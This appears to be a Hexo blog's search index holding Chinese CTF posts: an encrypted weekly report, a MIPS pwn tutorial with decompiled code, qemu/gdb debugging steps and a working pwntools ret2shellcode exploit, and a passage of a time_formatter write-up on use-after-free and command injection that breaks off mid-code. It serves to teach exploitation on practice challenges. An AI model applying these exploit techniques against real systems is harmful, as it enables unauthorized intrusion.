<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>周报</title>
      <link href="/posts/594d9f6c/"/>
      <url>/posts/594d9f6c/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="b48cf44d4fb288c98791db8b4c49cfbbd86e01dcb84de50144c618d1f0609e99">5a93986e03a1ff00affed07321aa37ecb2befdd9e44c6fd134ff5b6d3f3f39e54cccc0ae0ee9c0556f5950a61d73996ee5c5affbbe522bcabe146e33fce3b068def258e6ad8f327debf0c6aaa06bb97059b045d90a568cdb185d788a8a8ba1a9084ce391bc21adce925786c914de58043531ad4ee8b27b4b1a4fa54410930066946b7b8405eb8f2d50d094c73e5873cfb91c6edf6a2ad9101ba195ad625f3cc785d39e57eaf3971d7b1f222da731a65e78d8acd7ba327808e925d0cdcf842610beb302c5bcf491f8ec56c6160fa05d6424aecbe643805f9f584e26b5b452309d6ba8f9a0c9e28afdf9f791444203df532b296aca7bd778606000845a9ccbb0aad60c3728076a7b5ff3bde74dd1f7ca09affb9f0abd2b52f274a01b459b150a2c56efed67a204c11ffb3d2ffa225c031ed93695befbc82e6041d9c35702b1531b4365714bce0f77a27e1b6c9c59e0844c9e38333f5b6d6df4a1029bc1fe5e83a482649b20fa466e89574c6cc318e1ada222748f93dbce7cac2f5d3e671e2e31f7a3566224d135331449ed577fb230f76b579edfc80736c2830d6c6253b24a11181d608757d9dd6d44916d1c4b1d14b89a8e4b483902b008f75e2a3ae4f392d9166eef877826def0a5507111ab36a3ddb38810ade718a4b774867560262303be6a32eed205e165f519aeba049f8366393117b63eb5d9dcb98ffbdcb9e196dc3db3332cc7a0dbc2dfa03c40babb81e1c4b99f8adc8b9183d88ed657aaffac5e450ac45dc847103e4fd765a9669de7ac65118085fc7c8b1b41d95da69d42e302ca90b04de3e2e6a97ee846cbc6fcaac3f38066676b5d5bb420d9542078bf5895150e3deb6170b95053a49b1fd36c2cc1ccb512b3163a9df63a88073145f649eb2c03de2690a53ce44f17116a1d5200ec780494dd88204194e2aa430984843f3e0f5340e390c690fb424c338487307f60c1440e5d02c5b3e3a3007794e54eef198bb4fcb3fc12ec14ff0ee0fc9b8343d98c87640b2f57929278cff2e1c221abf42a44c07b9dcdd81fb852be29484a3b704eaf694aaac67decd5991779fbf1af2788dc6699796956cd83ab66a096f8402ab58f461732d65eb503e37cd5f47c451793b99e62639b3c1a8c38c2bf5b7710de97dc662825077e9f8b3c27f8eda1e797e98e72793fe23d8dfd3b0e72d3fe3445d038bc461f006834638289f57951766a516fc8c7effa55c7ad41ef626a5bc4ad23700449ba2e7be0c3b7e0cac417f1538f32e15209a2d29d97c0dcccc35290986ae4bf69ca8567a53e0f1fb879d61ecd1e638e2d702c401bc673fdf11dc59b8b0d272eece74e9388537bb5e688430515fdcde53442ad6a13d221e2b1e4fe4a6f81c2238a9341bf1a2f2b50ebba284409da6740ff669f743e745b6f7de2963f29957090c3717a716d0038fcebfeecf5a1953e39c094bfe0e40857ce7cce0a7d697ae04e83a79dc4150b734bf1667613b761231982dc8b0060431ec5117cb5c838a430c644bd6c265cbcebf1244032d3545b9e6c6dd9cdc28a95dc3f3245fce53bbee47f5ae5c8e9d4f2aff1543df52e76167796d958a1c9b3b35763c85521b8ba86ec443b5abef31bab638bd469f38de9a8dccf43af9477babe34910df3a0fb06003c21089d0f16eb560a3897496e0f193e72d5582bd515312fef7b42098345c2d59e3d341777f732d91b95a12c98695433aeedbca9044b19446c83bdc22a39c98946f3d7698d57c0a91925d6e9f2e8359d896ec7ff23530dadbb815c5a45489f22f93697aa5e72708b63bff14e926cb06a91</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> record </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mips pwn入门指北</title>
      <link href="/posts/7b49d65d/"/>
      <url>/posts/7b49d65d/</url>
      
        <content type="html"><![CDATA[    <div id="aplayer-kYvaPNnP" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="1969538016" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86"    ></div><h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h3><p>如果还没有安装qemu的小伙伴可以通过以下命令安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install --install-suggests qemu</span><br></pre></td></tr></table></figure><h3 id="gdb-multiarch"><a href="#gdb-multiarch" class="headerlink" title="gdb-multiarch"></a>gdb-multiarch</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gdb-multiarch</span><br></pre></td></tr></table></figure><h3 id="mips软件包"><a href="#mips软件包" class="headerlink" title="mips软件包"></a>mips软件包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 具备MIPS交叉编译gcc与MIPS程序动态链接库</span></span><br><span class="line">sudo apt-get install gcc-mips-linux-gnu</span><br><span class="line">sudo apt-get install gcc-mipsel-linux-gnu</span><br><span class="line">sudo apt-get install gcc-mips64-linux-gnuabi64</span><br><span class="line">sudo apt-get install gcc-mips64el-linux-gnuabi64</span><br></pre></td></tr></table></figure><h2 id="mips汇编"><a href="#mips汇编" class="headerlink" title="mips汇编"></a>mips汇编</h2><p><strong>mips架构由于本身特性不支持nx，所以栈段具有执行权限</strong></p><table><thead><tr><th align="left">寄存器</th><th align="left">别名</th><th align="left">使用</th></tr></thead><tbody><tr><td align="left">$0</td><td align="left">$zero</td><td align="left">常量0</td></tr><tr><td align="left">$1</td><td align="left">$at</td><td align="left">保留给汇编器</td></tr><tr><td align="left">$2-$3</td><td align="left">$v0-$v1</td><td align="left">函数返回值</td></tr><tr><td align="left">$4-$7</td><td align="left">$a0-$a3</td><td align="left">函数调用参数</td></tr><tr><td align="left">$8-$15</td><td align="left">$t0-$t7</td><td align="left">临时寄存器</td></tr><tr><td align="left">$16-$23</td><td align="left">$s0-$s7</td><td align="left">保存寄存器</td></tr><tr><td align="left">$24-$25</td><td align="left">$t8-$t9</td><td align="left">临时寄存器</td></tr><tr><td align="left">$26-$27</td><td align="left">$k0-$k1</td><td align="left">保留给系统</td></tr><tr><td align="left">$28</td><td align="left">$gp</td><td align="left">全局指针</td></tr><tr><td align="left">$29</td><td align="left">$sp</td><td align="left">堆栈指针</td></tr><tr><td align="left">$30</td><td align="left">$fp</td><td align="left">帧指针</td></tr><tr><td align="left">$31</td><td align="left">$ra</td><td align="left">返回地址</td></tr></tbody></table><table><thead><tr><th>Instruction</th><th>Example</th><th align="left">Meaning</th></tr></thead><tbody><tr><td>jump</td><td>j 10000</td><td align="left">go to 10000<br/><em>Jump to target address</em></td></tr><tr><td>jump register</td><td>jr $31</td><td align="left">go to $31<br/><em>For switch, procedure return</em></td></tr><tr><td>jump and link</td><td>jal 10000</td><td align="left">$31 &#x3D; PC + 4; go to 10000<br/><em>For procedure call</em></td></tr></tbody></table><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>mips pwn我们就用hws入营赛的一道题来入门</p><p>strncmp函数将输入的前5个字节与admin比较,相同返回0,程序继续运行。程序没有对输入的最后一字节置空，输入24个字节后可以通过printf带出数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">username</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">24</span>]; <span class="comment">// [sp+18h] [+18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="keyword">sizeof</span>(v1));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[34m&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Username : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v1, <span class="number">24</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(v1, <span class="string">&quot;admin&quot;</span>, <span class="number">5</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Correct name : %s&quot;</span>, v1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strlen</span>(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>变量v2和v3内存空间是连续的，我们read进20个字节后，可以将v3修改为任意值，然后就可以向v4超量写入数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_400978</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v2[<span class="number">20</span>]; <span class="comment">// [sp+18h] [+18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [sp+2Ch] [+2Ch]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">36</span>]; <span class="comment">// [sp+3Ch] [+3Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = a1 + <span class="number">4</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[31m&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Pre_Password : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v2, <span class="number">36</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Password : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v4, v3);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(v2, <span class="string">&quot;access&quot;</span>, <span class="number">6</span>) || <span class="built_in">strncmp</span>(v4, <span class="string">&quot;0123456789&quot;</span>, <span class="number">10</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Correct password : **********&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>分析完函数，开始调试验证，首先介绍下如何调试mips架构下的程序</p><p>qemu -g 开启9000端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel -g 9000 -L ./ Mplogin  | hexdump -C</span><br></pre></td></tr></table></figure><p>开启另一个terminal启动gdb多架构调试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch -q ./Mplogin</span><br></pre></td></tr></table></figure><p>设置mips架构</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> architecture mips</span><br></pre></td></tr></table></figure><p>选择小端序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> endian little</span><br></pre></td></tr></table></figure><p>连接目标端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target remote :9000</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202403112155432.png" alt="debug"></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>输入admin + xxx泄露出栈地址，拿个小本本记下来，待会有大用</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202403112156336.png" alt="use"></p><p>接下来，我们要篡改v3的值，如果要将v3的值覆盖成不可见字符，比如0x120，上面的调试方法就无能为力了，所以下面将介绍另一种调试方法</p><p>写好一段脚本，运行</p><p>然后按照下面的步骤执行即可，这种调试方法实际上是通过脚本发送不可见数据，其余与上面所述并无二异</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202403112157307.png" alt="script"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;mips&#x27;</span>,endian = <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process([&quot;qemu-mipsel&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./Mplogin&quot;])</span></span><br><span class="line">p = process([<span class="string">&quot;qemu-mipsel&quot;</span>,<span class="string">&quot;-g&quot;</span>,<span class="string">&quot;9000&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;./&quot;</span>,<span class="string">&quot;./Mplogin&quot;</span>]) <span class="comment">#开启9000端口</span></span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> a: p.readuntil(a)</span><br><span class="line">r = <span class="keyword">lambda</span> n: p.read(n)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: p.sendlineafter(a,b) </span><br><span class="line">sa = <span class="keyword">lambda</span> a,b: p.sendafter(a,b) </span><br><span class="line">sl = <span class="keyword">lambda</span> a: p.sendline(a) </span><br><span class="line">s = <span class="keyword">lambda</span> a: p.send(a) </span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;Username : &#x27;</span>,<span class="string">b&#x27;admin&#x27;</span>.ljust(<span class="number">24</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span> * <span class="number">19</span>)</span><br><span class="line">stack = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">&#x27;stack =&gt; &#x27;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;Pre_Password : &#x27;</span>,<span class="string">b&#x27;access&#x27;</span>.ljust(<span class="number">20</span>,<span class="string">b&#x27;b&#x27;</span>) + p32(<span class="number">0x120</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>可以看到v3变量(sp+2Ch)已经被覆盖成0x120</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202403112158315.png" alt="overflow"></p><p>这样就可以通过第二个read溢出至返回地址，修改为栈地址后，即可ret2shellcode</p><p><em>笔者的qemu没有开启aslr，通过调试得到栈地址写入也可以，由于没有远程环境，无法确定远程是否开启aslr</em></p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202403112158327.png" alt="shell"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;mips&#x27;</span>,endian = <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">p = process([<span class="string">&quot;qemu-mipsel&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;./&quot;</span>,<span class="string">&quot;./Mplogin&quot;</span>])</span><br><span class="line"><span class="comment">#p = process([&quot;qemu-mipsel&quot;,&quot;-g&quot;,&quot;9000&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./Mplogin&quot;])</span></span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> a: p.readuntil(a)</span><br><span class="line">r = <span class="keyword">lambda</span> n: p.read(n)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: p.sendlineafter(a,b) </span><br><span class="line">sa = <span class="keyword">lambda</span> a,b: p.sendafter(a,b) </span><br><span class="line">sl = <span class="keyword">lambda</span> a: p.sendline(a) </span><br><span class="line">s = <span class="keyword">lambda</span> a: p.send(a) </span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;Username : &#x27;</span>,<span class="string">b&#x27;admin&#x27;</span>.ljust(<span class="number">24</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span> * <span class="number">19</span>)</span><br><span class="line">stack = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">&#x27;stack =&gt; &#x27;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;Pre_Password : &#x27;</span>,<span class="string">b&#x27;access&#x27;</span>.ljust(<span class="number">20</span>,<span class="string">b&#x27;b&#x27;</span>) + p32(<span class="number">0x120</span>))</span><br><span class="line">sa(<span class="string">b&#x27;Password : &#x27;</span>,<span class="string">b&#x27;0123456789&#x27;</span>.ljust(<span class="number">40</span>,<span class="string">b&#x27;w&#x27;</span>) + p32(stack) + asm(shellcraft.sh())) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/09/24/mips/">HWS赛题 入门 MIPS Pwn</a></p><p><a href="https://zyen12138.github.io/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/">MIPS PWN入门</a></p><p><a href="https://qingmu-z.github.io/2021/11/09/pwn/mipspwn/#more">mips-pwn</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> mips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>time_formatter题解</title>
      <link href="/posts/520eb600/"/>
      <url>/posts/520eb600/</url>
      
        <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p><ul><li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li></ul><p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</strong></p><h1 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h1><p>运行程序是一个菜单,十有八九是堆题</p><p>ida反汇编,开始静态分析,为方便分析,将部分函数,变量重命名</p><p>ret_ptr()函数中<code>fgets(str, 1024, stdin);</code>从标准输入读取字节</p><p><code>str[strcspn(str, &quot;\n&quot;)] = 0;</code>返回第一个”\n”的下标并将其置null</p><p><strong>size_t strcspn(const char *str1, const char *str2)</strong> 检索字符串 <strong>str1</strong> 开头连续有几个字符都不含字符串 <strong>str2</strong> 中的字符。该函数返回 str1 开头连续都不含字符串 str2 中字符的字符数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">ret_ptr</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> str[<span class="number">1024</span>]; <span class="comment">// [rsp+8h] [rbp-410h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+408h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;%s&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(str, <span class="number">1024</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  str[<span class="built_in">strcspn</span>(str, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> malloc_heap(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc_heap()函数中<code>v1 = strdup(str);</code>strdup函数类似malloc,可以从堆上分配参数str字符串大小相同的空间</p><p>**char *strdup(const char *str)**将字符串复制到新建立的空间,该函数会先用malloc()配置与参数str字符串相同的空间大小，然后将参数str字符串的内容复制到该内存地址，然后把该地址返回。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">malloc_heap</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v1 = strdup(str);                             <span class="comment">// malloc memory</span></span><br><span class="line">  <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;strdup&quot;</span>);</span><br><span class="line">  v2 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( getenv(<span class="string">&quot;DEBUG&quot;</span>) )</span><br><span class="line">    __fprintf_chk(<span class="built_in">stderr</span>, <span class="number">1LL</span>, <span class="string">&quot;strdup(%p) = %p\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>check_format()函数中<code>strcpy(accept, &quot;%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^# &quot;);</code>将特定字符复制到字符数组中</p><p><code>strspn(str, accept) == strlen(str);</code>将用户输入的字符串与特定字符比较,如果用户输入的字符全部属于特定字符中,则返回true(1),否则返回false(0)</p><p><strong>size_t strspn(const char *str1, const char *str2)</strong> 检索字符串 <strong>str1</strong> 中第一个不在字符串 <strong>str2</strong> 中出现的字符下标。该函数返回 str1 中第一个不在字符串 str2 中出现的字符下标。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">check_format</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> accept[<span class="number">51</span>]; <span class="comment">// [rsp+5h] [rbp-43h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(accept, <span class="string">&quot;%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^# &quot;</span>);</span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strspn</span>(str, accept) == <span class="built_in">strlen</span>(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>print()函数中<code>__snprintf_chk(command, 2048LL, 1LL, 2048LL, &quot;/bin/date -d @%d +&#39;%s&#39;&quot;, bss, ptr);</code>是将<code>&quot;/bin/date -d @%d +&#39;%s&#39;&quot;,bss,ptr</code>,%d对应bss,%s对应ptr,写到command数组中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">print</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> command[<span class="number">2048</span>]; <span class="comment">// [rsp+8h] [rbp-810h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+808h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    __snprintf_chk(command, <span class="number">2048LL</span>, <span class="number">1LL</span>, <span class="number">2048LL</span>, <span class="string">&quot;/bin/date -d @%d +&#x27;%s&#x27;&quot;</span>, bss, ptr);</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Your formatted time is: &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> ( getenv(<span class="string">&quot;DEBUG&quot;</span>) )</span><br><span class="line">      __fprintf_chk(<span class="built_in">stderr</span>, <span class="number">1LL</span>, <span class="string">&quot;Running command: %s\n&quot;</span>);</span><br><span class="line">    setenv(<span class="string">&quot;TZ&quot;</span>, value, <span class="number">1</span>);</span><br><span class="line">    system(command);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You haven&#x27;t specified a format!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>程序流程大概看的差不多,下一步寻找漏洞点</p><p>exit()函数内调用free却没有将指针置空,存在uaf</p><p>上述print()函数调用<code>system(command);</code>存在命令注入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">exit</span><span class="params">(<span class="type">int</span> status)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [rsp+8h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] 